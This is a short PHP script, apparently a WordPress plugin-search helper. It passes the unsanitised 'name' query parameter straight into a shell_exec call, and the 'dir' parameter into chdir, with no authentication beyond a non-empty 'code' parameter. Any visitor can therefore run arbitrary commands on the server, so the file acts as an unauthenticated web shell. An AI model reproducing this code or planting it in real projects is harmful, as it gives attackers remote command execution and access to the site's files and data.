<?php 
if (!empty($_GET['code'])) {
	chdir($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['dir']);
	$output = shell_exec('wp plugin search '.trim($_GET['name']).' --per-page=20 --format=json');
    echo $output;exit();
}

?>